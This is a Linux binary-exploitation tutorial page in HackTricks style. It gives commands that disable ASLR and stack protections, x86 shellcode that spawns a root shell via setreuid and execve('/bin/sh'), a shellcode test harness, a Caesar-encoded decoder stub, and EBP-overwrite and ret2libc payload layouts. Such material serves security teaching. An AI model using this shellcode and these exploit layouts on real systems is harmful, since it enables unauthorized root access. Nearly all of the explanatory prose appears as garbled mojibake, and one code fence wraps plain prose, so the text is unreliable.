# Linux Exploiting (Basic) (SPA)

## Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

## **ASLR**

рдкрддрд╛ рдпрд╛рджреГрдЪреНрдЫрд┐рдХрд░рдг

**рд╡реИрд╢реНрд╡рд┐рдХ рдпрд╛рджреГрдЪреНрдЫрд┐рдХрд░рдг (ASLR) рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░реЗрдВ (рд░реВрдЯ)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
рд╡реИрд╢реНрд╡рд┐рдХ рдпрд╛рджреГрдЪреНрдЫрд┐рдХрд░рдг рдкреБрдирдГ рд╕рдХреНрд░рд┐рдп рдХрд░реЗрдВ: echo 2 > /proc/sys/kernel/randomize\_va\_space

**рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░реЗрдВ** (рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ):\
setarch \`arch\` -R ./ejemplo argumentos\
setarch \`uname -m\` -R ./ejemplo argumentos

**рд╕реНрдЯреИрдХ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдВрд░рдХреНрд╖рдг рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░реЗрдВ**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack ejemplo.c -o ejemplo

**рдХреЛрд░ рдлрд╝рд╛рдЗрд▓**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**рдЯреЗрдХреНрд╕реНрдЯ**\
**рдбреЗрдЯрд╛**\
**BSS**\
**рд╣реАрдк**

**рд╕реНрдЯреИрдХ**

**BSS рдЕрдиреБрднрд╛рдЧ**: рдЕрдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╡реИрд╢реНрд╡рд┐рдХ рдпрд╛ рд╕реНрдерд┐рд░ рдЪрд░
```
static int i;
```
**рдбрд╛рдЯрд╛ рд╕реЗрдХреНрд╢рди**: рдЗрдирд┐рд╢рд┐рдпрд▓рд╛рдЗрдЬреНрдб рдЧреНрд▓реЛрдмрд▓ рдпрд╛ рд╕реНрдЯреИрдЯрд┐рдХ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕
```
int i = 5;
```
**рдЕрдиреБрднрд╛рдЧ TEXT**: рдХреЛрдб рдирд┐рд░реНрджреЗрд╢ (opcodes)

**рдЕрдиреБрднрд╛рдЧ HEAP**: рдЧрддрд┐рд╢реАрд▓ рд░реВрдк рд╕реЗ рдЖрд░рдХреНрд╖рд┐рдд рдмрдлрд░ (malloc(), calloc(), realloc())

**рдЕрдиреБрднрд╛рдЧ STACK**: рд╕реНрдЯреИрдХ (рдкрд╛рд░рд┐рдд рддрд░реНрдХ, рдкрд░реНрдпрд╛рд╡рд░рдг рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ (env), рд╕реНрдерд╛рдиреАрдп рдЪрд░тАж)

## **1.STACK OVERFLOWS**

> buffer overflow, buffer overrun, stack overrun, stack smashing

рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЙрд▓реНрдЯ рдпрд╛ рд╕реЗрдЧрдореЗрдВрдЯ рдЙрд▓реНрд▓рдВрдШрди: рдЬрдм рдХрд┐рд╕реА рдореЗрдореЛрд░реА рдкрддреЗ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ рдЬреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдХрд┐рд╕реА рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЗ рднреАрддрд░ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### sys\_execve рдХреЙрд▓

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

рдХрд░реНрдиреЗрд▓ рдЗрдВрдЯрд░рдкреНрдЯреНрд╕ рджреЗрдЦреЗрдВ: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep тАЬ\_\_NR\_тАЭ

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(тАЬ/bin/shтАЭ, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax рдХреЛ рд╕рд╛рдл рдХрд░реЗрдВ\
xor ebx, ebx ; ebx = 0 рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ рдЖрд░реНрдЧреБрдореЗрдВрдЯ рдкрд╛рд╕ рдирд╣реАрдВ рдХрд░рдирд╛ рд╣реИ\
mov al, 0x01 ; eax = 1 тАФ> \_\_NR\_exit 1\
int 0x80 ; syscall рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ

**nasm -f elf assembly.asm** тАФ> рд╣рдореЗрдВ .o рдлрд╛рдЗрд▓ рджреЗрддрд╛ рд╣реИ\
**ld assembly.o -o shellcodeout** тАФ> рдЕрд╕реЗрдВрдмрд▓рд░ рдХреЛрдб рд╕реЗ рдмрдирд╛ рдПрдХ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рджреЗрддрд╛ рд╣реИ рдФрд░ рд╣рдо **objdump** рдХреЗ рд╕рд╛рде opcodes рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ\
**objdump -d -Mintel ./shellcodeout** тАФ> рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╣рдорд╛рд░рд╛ shellcode рд╣реИ рдФрд░ OpCodes рдирд┐рдХрд╛рд▓реЗрдВ

**рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ shellcode рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИ**
```
char shellcode[] = тАЬ\x31\xc0\x31\xdb\xb0\x01\xcd\x80тАЭ

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">тАЛ</span>
```
рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓реНрд╕ рдХреЗ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП, рдкрд┐рдЫрд▓реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓реНрд╕ рдХреЛ **strace ./PROGRAMA\_COMPILADO** рдореЗрдВ рджрд┐рдЦрдирд╛ рдЪрд╛рд╣рд┐рдПред

рд╢реЗрд▓рдХреЛрдбреНрд╕ рдмрдирд╛рддреЗ рд╕рдордп рдПрдХ рдЪрд╛рд▓ рдХрд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдкрд╣рд▓рд╛ рдирд┐рд░реНрджреЗрд╢ рдПрдХ рдЬрдВрдк рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдХреЙрд▓ рдкрд░ рдЬрд╛рддрд╛ рд╣реИред рдХреЙрд▓ рдореВрд▓ рдХреЛрдб рдХреЛ рдмреБрд▓рд╛рддрд╛ рд╣реИ рдФрд░ рд╕рд╛рде рд╣реА рд╕реНрдЯреИрдХ рдореЗрдВ EIP рднреА рдбрд╛рд▓рддрд╛ рд╣реИред рдХреЙрд▓ рдирд┐рд░реНрджреЗрд╢ рдХреЗ рдмрд╛рдж рд╣рдордиреЗ рдЬреЛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдбрд╛рд▓реА рд╣реИ, рдЙрд╕рдХреЗ рд╕рд╛рде рдЙрд╕ EIP рдХрд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рдХреЗ рд╣рдо рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд╛рде рд╣реА рдХреЛрдб рдХреЛ рдЖрдЧреЗ рднреА рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрджрд╛. **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al ├║ltimo call
popl                %esi                                       ; Guardamos en ese la direcci├│n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=тАЬ/bin/shтАЭ
leal                 0x8(%esi), %ecx      ; arg[2] = {тАЬ/bin/shтАЭ, тАЬ0тАЭ}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(тАЬ/bin/shтАЭ, [тАЬ/bin/shтАЭ, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci├│n
.string             \тАЭ/bin/sh\тАЭ                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">тАЛ</span>
```
**EJ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; тАЬ\0тАЭ
push               dword 0x68732f2f ; тАЬ//shтАЭ
push               dword 0x6e69622f; тАЬ/binтАЭ
mov                ebx, esp                     ; arg1 = тАЬ/bin//sh\0тАЭ
push               eax                             ; Null -> args[1]
push               ebx                             ; тАЬ/bin/sh\0тАЭ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(тАЬ/bin/shтАЭ, args[тАЬ/bin/shтАЭ, тАЬNULLтАЭ], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut├│ fabs
тАж
```
**Egg Hunter:**

рдпрд╣ рдПрдХ рдЫреЛрдЯрд╛ рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рдкреНрд░реЛрд╕реЗрд╕ рд╕реЗ рдЬреБрдбрд╝реЗ рдореЗрдореЛрд░реА рдкреЗрдЬреЗрд╕ рдХреЛ рдЯреНрд░реИрд╡рд░реНрд╕ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣рд╛рдВ рд╕рдВрдЧреНрд░рд╣реАрдд shellcode рдХреЛ рдвреВрдВрдв рд╕рдХреЗ (shellcode рдореЗрдВ рд░рдЦреЗ рдЧрдП рдХрд┐рд╕реА рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ)ред рдпрд╣ рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдХреЗрд╡рд▓ рдПрдХ рдЫреЛрдЯреА рдЬрдЧрд╣ рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╣реЛрддреА рд╣реИред

**Shellcodes рдкреЛрд▓рд┐рдореЛрд░реНрдлрд┐рдХ**

рдпреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб shells рд╣реЛрддреЗ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдПрдХ рдЫреЛрдЯрд╛ рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдирдореЗрдВ рдЬрдВрдк рдХрд░рддрд╛ рд╣реИ, Call-Pop рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдпрд╣ рдПрдХ **рдЙрджрд╛рд╣рд░рдг рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╕реАрдЬрд╝рд░** рд╣реЛрдЧрд╛:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer├б)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu├н va el shellcode
```
1. **рдлреНрд░реЗрдо рдкреЙрдЗрдВрдЯрд░ (EBP) рдкрд░ рд╣рдорд▓рд╛**

EBP рдХреЛ рдореЙрдбрд┐рдлрд╛рдИ рдХрд░рдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИ рд▓реЗрдХрд┐рди EIP рдХреЛ рдирд╣реАрдВред

рдпрд╣ рдЬреНрдЮрд╛рдд рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдлрдВрдХреНрд╢рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддреЗ рд╕рдордп рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрд╕реЗрдВрдмрд▓рд░ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ:
```
movl               %ebp, %esp
popl                %ebp
ret
```
```
рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдпрджрд┐ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди (fvuln) рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддреЗ рд╕рдордп EBP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдХрд┐рд╕реА рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рди рдиреЗ рдХреЙрд▓ рдХрд┐рдпрд╛ рд╣реИ, рддреЛ рдЬрдм рд╡рд╣ рдлрд╝рдВрдХреНрд╢рди рдЬрд┐рд╕рдиреЗ fvuln рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рд╣реИ рд╕рдорд╛рдкреНрдд рд╣реЛрдЧрд╛, рдЙрд╕рдХрд╛ EIP рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

fvuln рдореЗрдВ рдПрдХ рдирдХрд▓реА EBP рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╢реЗрд▓рдХреЛрдб рдХреЗ рдбрд╛рдпрд░реЗрдХреНрд╢рди + 4 (рдкреЙрдк рдХреЗ рд▓рд┐рдП 4 рдЬреЛрдбрд╝рдирд╛ рд╣реЛрдЧрд╛) рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддреЗ рд╕рдордп, ESP рдореЗрдВ &(\&Shellcode)+4 рдХрд╛ рдорд╛рди рдбрд╛рд▓рд╛ рдЬрд╛рдПрдЧрд╛, рдкреЙрдк рдХреЗ рд╕рд╛рде ESP рд╕реЗ 4 рдШрдЯрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдпрд╣ рд╢реЗрд▓рдХреЛрдб рдХреЗ рдбрд╛рдпрд░реЗрдХреНрд╢рди рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗрдЧрд╛ рдЬрдм ret рдХреЛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + рд░реЗрд▓реЗрдиреЛ + &(\&Shellcode)+4

**Off-by-One Exploit**\
рдХреЗрд╡рд▓ EBP рдХреЗ рд╕рдмрд╕реЗ рдХрдо рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд╛рдЗрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред рдкрд┐рдЫрд▓реЗ рд╣рдорд▓реЗ рдХреА рддрд░рд╣ рдПрдХ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╢реЗрд▓рдХреЛрдб рдХреЗ рдбрд╛рдпрд░реЗрдХреНрд╢рди рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рдореЗрдореЛрд░реА рдХреЛ EBP рдХреЗ рдкрд╣рд▓реЗ 3 рдмрд╛рдЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╛рдЭрд╛ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

## **4. рд░рд┐рдЯрд░реНрди рдЯреВ рд▓рд┐рдмрд╕реА рдореЗрдердбреНрд╕**

рдЬрдм рд╕реНрдЯреИрдХ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ рдпрд╛ рдмрд╣реБрдд рдЫреЛрдЯрд╛ рдмрдлрд░ рдЫреЛрдбрд╝рддрд╛ рд╣реИ рддреЛ рдпрд╣ рдореЗрдердб рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИред

ASLR рдХреЗ рдХрд╛рд░рдг рд╣рд░ рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рдореЗрдВ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдореЗрдореЛрд░реА рдкреЛрдЬреАрд╢рдиреНрд╕ рдореЗрдВ рд▓реЛрдб рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП рдЗрд╕ рдореЗрдердб рдХрд╛ рдкреНрд░рднрд╛рд╡реА рд╣реЛрдирд╛ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рд░рд┐рдореЛрдЯ рд╕рд░реНрд╡рд░реНрд╕ рдХреЗ рд▓рд┐рдП, рдЬреИрд╕реЗ рдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд▓рдЧрд╛рддрд╛рд░ рдПрдХ рд╣реА рдбрд╛рдпрд░реЗрдХреНрд╢рди рдореЗрдВ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рд╣реЛ рд░рд╣рд╛ рд╣реИ, рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

* **cdecl(C declaration)** рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯреНрд╕ рдХреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рдмрд╛рдж рд╕реНрдЯреИрдХ рдХреЛ рд╕рд╛рдл рдХрд░рддрд╛ рд╣реИ
* **stdcall(standard call)** рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯреНрд╕ рдХреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рдХреЙрд▓ рдХрд┐рдП рдЧрдП рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рд╕реНрдЯреИрдХ рд╕рд╛рдл рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ
* **fastcall** рдкрд╣рд▓реЗ рджреЛ рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯреНрд╕ рдХреЛ рд░рдЬрд┐рд╕реНрдЯрд░реНрд╕ рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рдмрд╛рдХреА рдХреЛ рд╕реНрдЯреИрдХ рдореЗрдВ

libc рдХреЗ system рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди рдХрд╛ рдбрд╛рдпрд░реЗрдХреНрд╢рди рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдЯреНрд░рд┐рдВрдЧ тАЬ/bin/shтАЭ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЖрдорддреМрд░ рдкрд░ рдПрдХ рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓ рд╕реЗред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдХреНрдЬрд┐рдЯ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдбрд╛рдпрд░реЗрдХреНрд╢рди рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдПрдХ рдмрд╛рд░ рдЬрдм рд╢реЗрд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рддреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдмрд┐рдирд╛ рдХрд┐рд╕реА рд╕рдорд╕реНрдпрд╛ рдХреЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рдЬрд╛рдП (рдФрд░ рд▓реЙрдЧреНрд╕ рд▓рд┐рдЦреЗ)ред

**export SHELL=/bin/sh**

рдЬрд░реВрд░реА рдбрд╛рдпрд░реЗрдХреНрд╢рдиреНрд╕ рдХреЛ рдвреВрдБрдврдиреЗ рдХреЗ рд▓рд┐рдП **GDB:** рдХреЗ рдЕрдВрджрд░ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:\
**p system**\
**p exit**\
**rabin2 -i ejecutable** тАФ> рдкреНрд░реЛрдЧреНрд░рд╛рдо рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЧрдП рд╕рднреА рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХрд╛ рдбрд╛рдпрд░реЗрдХреНрд╢рди рджреЗрддрд╛ рд╣реИ\
(рдХрд┐рд╕реА рд╕реНрдЯрд╛рд░реНрдЯ рдпрд╛ рдмреНрд░реЗрдХрдкреЙрдЗрдВрдЯ рдХреЗ рдЕрдВрджрд░): **x/500s $esp** тАФ> рдпрд╣рд╛рдБ рд╣рдо /bin/sh рд╕реНрдЯреНрд░рд┐рдВрдЧ рдвреВрдБрдврддреЗ рд╣реИрдВ

рдПрдХ рдмрд╛рд░ рдЬрдм рд╣рдореЗрдВ рдпреЗ рдбрд╛рдпрд░реЗрдХреНрд╢рдиреНрд╕ рдорд┐рд▓ рдЬрд╛рдПрдВ, рддреЛ **exploit** рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣реЛрдЧрд╛:

тАЬAтАЭ \* EBP рддрдХ рдХреА DISTANCIA + 4 (EBP: 4 "A"s рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЕрд╕рд▓реА EBP рд╣реЛрдирд╛ рдмреЗрд╣рддрд░ рд╣реИ рддрд╛рдХрд┐ рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЗрд▓реНрдпреЛрд░ рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗ) + **system** рдХрд╛ рдбрд╛рдпрд░реЗрдХреНрд╢рди (EIP рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдЧрд╛) + **exit** рдХрд╛ рдбрд╛рдпрд░реЗрдХреНрд╢рди (system(тАЬ/bin/shтАЭ) рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдкрд░ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╕реНрдЯреИрдХ рдХреЗ рдкрд╣рд▓реЗ 4рдмрд╛рдЗрдЯреНрд╕ рдХреЛ EIP рдХреЗ рдЕрдЧрд▓реЗ рдбрд╛рдпрд░реЗрдХреНрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рдЯреНрд░реАрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ) + тАЬ**/bin/sh**тАЭ рдХрд╛ рдбрд╛рдпрд░реЗрдХреНрд╢рди (рдпрд╣ system рдХреЛ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдкреИрд░рд╛рдореАрдЯрд░ рд╣реЛрдЧрд╛)

